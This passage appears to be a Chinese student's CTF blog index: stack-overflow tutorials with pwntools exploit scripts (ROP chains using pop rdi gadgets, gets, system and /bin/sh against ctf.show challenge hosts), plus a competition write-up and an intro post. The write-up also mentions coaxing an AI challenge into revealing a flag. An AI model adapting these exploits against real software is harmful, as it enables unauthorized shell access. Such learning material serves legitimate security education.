class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28140</span>)</span><br><span class="line"></span><br><span class="line">bin_addr=<span class="number">0x400808</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x4007e3</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x4004fe</span></span><br><span class="line"></span><br><span class="line">system=<span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line">paylode=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(bin_addr)+p64(ret)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(paylode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>paylode中：</p><p>0xA+8个填充字节（用’a’填充）：用于填充到栈溢出的位置，达到返回地址的偏移。<br>pop_rdi：用于将下一个值弹出到rdi寄存器中。<br>bin_sh：需要执行的系统命令字符串的地址。<br>ret：用于绕过栈中的返回地址，返回到调用者。<br>system：系统函数system的地址，用于执行系统命令。</p><p>动态图示如下(kimi最好用的一次)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">1. 栈初始化：假设我们有一个函数调用，其栈布局如下：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   返回地址     |</span><br><span class="line">|   其他局部变量 |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">2. 填充字节：首先，我们通过  b&#x27;a&#x27;*(0xA+8)  填充0xA+8个字节（即10个字节）到栈上，这些字节将覆盖函数的局部变量和参数，直到达到返回地址的位置：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   返回地址     |</span><br><span class="line">|   aaaaa...     |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">3. pop_rdi指令地址：接下来，我们将  pop_rdi  指令的地址（  p64(pop_rdi)  ）放入栈中，这个地址将被用作返回地址，当函数返回时，控制流将跳转到  pop_rdi  指令：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   pop_rdi_ret地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">4. bin_sh地址：紧接着，我们将  bin_sh  （即  /bin/sh  字符串的地址）放入栈中，这个地址将被  pop_rdi  指令弹出到  rdi  寄存器中：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   bin_sh地址    |</span><br><span class="line">|   pop_rdi_ret地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">5. ret指令地址：然后，我们将  ret  指令的地址放入栈中，这个地址将被  pop_rdi  之后的  ret  指令作为返回地址使用：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   ret地址       |</span><br><span class="line">|   bin_sh地址    |</span><br><span class="line">|   pop_rdi_ret地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">6. system函数地址：最后，我们将  system  函数的地址放入栈中，这个地址将被  ret  指令之后的  ret  指令作为返回地址使用，从而调用  system  函数：</span><br><span class="line">+----------------+ &lt;- 栈顶</span><br><span class="line">|   system地址    |</span><br><span class="line">|   ret地址       |</span><br><span class="line">|   bin_sh地址    |</span><br><span class="line">|   pop_rdi_ret地址   |</span><br><span class="line">|   aaaa...       |</span><br><span class="line">+----------------+</span><br><span class="line">|   参数1        |</span><br><span class="line">|   参数2        |</span><br><span class="line">+----------------+ &lt;- 栈底</span><br><span class="line">函数返回：当原始函数执行到返回指令时，它会跳转到  pop_rdi_ret  地址，执行  pop_rdi_ret  指令，将  bin_sh  地址加载到  rdi  寄存器中。</span><br><span class="line">调用system：接着，控制流通过  ret  指令跳转到  system  函数的地址，  system  函数被调用，执行  /bin/sh  命令。</span><br></pre></td></tr></table></figure><p> ret  指令的作用包括：</p><ol><li>恢复栈指针：  ret  指令会将栈指针（ESP寄存器在32位系统中，或者RSP寄存器在64位系统中）增加一个特定的值，通常是四个字节（32位系统）或八个字节（64位系统）。这个增加的值取决于在调用函数时，函数的返回类型。这样做是为了移除函数调用时压入栈中的参数和可能的其他数据。</li><li>跳转到返回地址：  ret  指令会从<strong>栈顶</strong>弹出一个字（32位系统）或双字（64位系统），这个值是函数调用时保存的返回地址，即调用函数之前的指令地址。  ret  指令将这个地址加载到指令指针（EIP寄存器在32位系统中，或者RIP寄存器在64位系统中），从而使CPU跳转到这个地址继续执行。</li></ol><h3 id="32位无-bin-sh"><a href="#32位无-bin-sh" class="headerlink" title="32位无&#x2F;bin&#x2F;sh"></a>32位无&#x2F;bin&#x2F;sh</h3><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28267</span>)</span><br><span class="line"></span><br><span class="line">gets=<span class="number">0x08048420</span></span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x0804B060</span></span><br><span class="line"></span><br><span class="line">system=<span class="number">0x08048450</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">4</span>)+p32(gets)+p32(system)+p32(buf2)+p32(buf2)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>分析：</p><p>走流程checeksec——&gt;canary没开，开了nx</p><p>分析源码发现gets漏洞，后门函数system但是没有&#x2F;bin&#x2F;sh</p><p>因为开了NX不能直接写入所以利用gadgets尝试写入参数</p><p>先找可写入的地址，利用gdb调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gdb</span> pwn</span><br><span class="line"><span class="variable">$b</span> main</span><br><span class="line"><span class="variable">$r</span></span><br><span class="line"><span class="variable">$vmmap</span>//查看各内存段的权限信息</span><br><span class="line">       r-可读 w-可写 x-可执行 s-共享</span><br></pre></td></tr></table></figure><p><img src="/../images/ret2text/1732630486522.png" alt="1"></p><p>发现0x804b000到0x804c000是可写的，刚好对应到bss段，在bss段发现一个buf2变量，故可将&#x2F;bin&#x2F;sh写入buf2</p><p>故开始构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">4</span>)+p32(gets)+p32(system)+p32(buf2)+p32(buf2)</span><br></pre></td></tr></table></figure><p>（0x6C+4）填充数据到返回地址，用gets@plt的地址覆盖构造二次输入，压入system@plt作为执行完gets函数的返回地址，压入buf2作为gets函数的参数，再次压入buf2作为system的参数，遵守函数 返回地址 参数的布局 <strong>32位是栈传参所以可以直接把参数压入栈上正常模拟函数调用</strong></p><p>压入call system_addr和压入system的区别：</p><p>• 直接调用  system  ：需要提供  system  函数的地址和返回地址，以及  system  函数的参数。</p><p>• 调用  call system  ：只需要提供  call system  指令的地址和  system  函数的参数。  call  指令会自动处理返回地址的压栈和跳转。</p><p>这里有一种通用性更强的payload的构造方式，遵循用完即丢的原则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*(0x6C+4)+p32(gets)+p32(pop_ebx_ret)+p32(buf2)+p32(system)+p32(0)+p32(buf2)</span><br></pre></td></tr></table></figure><h3 id="64位无-bin-sh"><a href="#64位无-bin-sh" class="headerlink" title="64位无&#x2F;bin&#x2F;sh"></a>64位无&#x2F;bin&#x2F;sh</h3><p>32位为栈传参，故不需要将参数弹入寄存器中，64位前6个参数是储存在寄存器RDI 、RSI 、RDX 、RCX 、R8 和 R9 这六个寄存器传递中的存满之后再从右到左依次压入栈中</p><p>该题与上题逻辑相似只是传参方式改变了</p><p>获得ROPgadget的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rdi&#x27;</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28244</span>)</span><br><span class="line"></span><br><span class="line">gets=<span class="number">0x400530</span></span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x602080</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x4007f3</span></span><br><span class="line"></span><br><span class="line">system=<span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(buf2)+p64(gets)\</span><br><span class="line">        +p64(pop_rdi)+p64(buf2)+p64(system)+p64(<span class="number">0</span>)+p64(buf2)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>payload中：</p><p>第一步劫持执行流</p><p>第一次压入pop_rdi将buf2弹入rdi寄存器中然后返回到下一个gets函数地址构造二次输入</p><p>第二次将pop_rid地址压入栈中，其位置为执行完gets函数后的返回地址,该pop_rdi用于将利用gets函数接收到的’&#x2F;bin&#x2F;sh’弹入rdi寄存器中，接着将执行流ret到system函数上</p><p>接着就是调用system，含有’&#x2F;bin&#x2F;sh’的buf2变量充当system的参数，获得shell</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024玄武杯</title>
      <link href="/2024/10/12/%E7%8E%84%E6%AD%A6%E6%9D%AF/"/>
      <url>/2024/10/12/%E7%8E%84%E6%AD%A6%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>序：玄武杯pwn只出了两题签到题有点可惜，但是还是学到了很多东西（下次不会再被保护吓到了！！）</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="misc0："><a href="#misc0：" class="headerlink" title="misc0："></a>misc0：</h2><p>一题图片识别题，刚开始还没头绪结果直接公布答案了qwq，看了学长的wp后发现了用谷歌识图就出来了</p><h2 id="misc1："><a href="#misc1：" class="headerlink" title="misc1："></a>misc1：</h2><p>编码转换，给了一串二进制题目提示组cp，猜测应该要转为字符故首先尝试将其转为ASCII字符，出现一段有cp，的字符串，拖工具一键解码没出来，看元素只有了两个所以试着改了一下摩斯码，把c换成 . 把p换成 - ，当作分隔符，（因为没想到写脚本转就手打了，打完之后眼睛花了还出错了好几次，下次一定写脚本转），转换之后解码包裹得解，后来<strong>查文章发现cp也是摩斯码的一种表现形式</strong></p><h2 id="misc2："><a href="#misc2：" class="headerlink" title="misc2："></a>misc2：</h2><p>信息查找题，给了一张图片查该飞机在当天10点经过哪个城市</p><p><img src="/../images/3.jpg" alt="1"></p><p>从图片中可以看到飞机机翼上有飞机的编号B-20A6，另一架飞机上有航空公司名字且两架飞机的logo一样故确认为中国国际航空公司的飞机，打开文件属性发现备注了拍摄时间2024年10月12号00:00故确认了范围，接下来寻找能够查航空轨迹的工具，我用的是航旅纵横里面可以用航班号、飞机编号查具体时间的飞机的飞行轨迹。</p><h2 id="misc3："><a href="#misc3：" class="headerlink" title="misc3："></a>misc3：</h2><p>snow隐写做了两次了，附件给了一个.txt文件（名字叫雪花一片一片，有隐藏的字符故断定为snow隐写）和一个.png文件（短了一截），png文件直接拖工具爆了宽高发现玛卡巴卡字符（打这个字符也打得眼睛花和图片底色混在一起ai识别不出来）再次拖字符解密得到key，再再把.txt文件拖工具输入key得解</p><h2 id="misc4："><a href="#misc4：" class="headerlink" title="misc4："></a>misc4：</h2><p>拼二维码，用ps创建白色底板拼，注意像素点对齐，再结合二维码的结构拼注意右下角的定位标志（给定的顺序不一定是拼的顺序）</p><h2 id="misc5："><a href="#misc5：" class="headerlink" title="misc5："></a>misc5：</h2><p>AI题，挺好玩的一题（给AI当舔狗要flag，这被子有了），做ai题感觉还是要结合AI回答问题的方式，掌握ai的原理当然多问问结合规律也可以出（对AI还挺感兴趣的后面有时间应该会研究一下）</p><h2 id="msic6："><a href="#msic6：" class="headerlink" title="msic6："></a>msic6：</h2><p>这题本来能出的，可能是工具版本没下对，一题音频加密+阴阳怪气编码，用DsspSound可以把文件隐藏的到音频中也可以把音频中的文件用key提取出来</p><p>Misc小结：取证和流量分析还没有学后期会恶补一下，这次学了信息收集、AI、音频隐写，但都挺基础的，有点依赖工具了对各类文件的16进制文件信息（文件头，文件尾，图片宽高具体修改位置）还未掌握完全</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><p>crypto0：base家族，第一次见到base45编码（字符范围：0-9A-Z $%*+-.&#x2F;:）还有很多种base编码，<strong>感谢学姐给的厨子</strong>非常好用！！先用45转再用64-32-16最后得解</p><p>后边的密码题就没出了，知识点很多都见过但是没python环境就没做成，之后会配一个完整一点的环境来做密码题，其他题也可以用python写脚本解决很多繁琐问题</p><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>这次逆向出了很多题，学长比较手下留情，前4题都能直接拖IDA分析main函数分析或者汇编里就有flag，对查壳还不了解所以后边两题没出来，正所谓逆向和pwn一家亲，后续会补一点逆向的知识</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>对汇编了解的太少了，程序执行的流程函数的调用过程也学的一知半解的，pwn的知识点也学的不多所以这次只解了签到，但是学了一点python学会怎么跳过行数接受输出！！最近会把重心放到学理论知识上，c语言指针还没有学，进一步了解汇编</p><p>esey_shell：一题简单的重定向指令题，1&gt;&amp;0 1表示标准输出，0表示标准输入，&gt;表示重定向，题目给了一个shell直接用重定向指令即可</p><p>后续pwn题还没复现出来，涉及的一些知识点还没学完，因为准备比赛积攒了好多学校里的作业所以这两天就先赶作业了，后续复现了会再更新</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>打新生赛还是很开心的，虽然说室友说我打两天比赛人都打憔悴了，但是还是学到了挺多东西的，非常感谢学长学姐们精心准备的题目,后续会继续努力的！</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇文章</title>
      <link href="/2024/10/10/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2024/10/10/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>要感谢baozongwi&#x2F;&#x2F;学长，帮我搭建了基础的hexo并装好了主题，并且在学习上帮了我很多，我会努力学习不辜负学长期望的！！</p><h2 id="记录一下自己的目标："><a href="#记录一下自己的目标：" class="headerlink" title="记录一下自己的目标："></a>记录一下自己的目标：</h2><p>希望成为一名资深pwn手，能够在二进制方面有所成就。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>因为刚入门，主题也没完全配置好所以博客会比较简陋，学习的知识也很少所以文章会比较基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
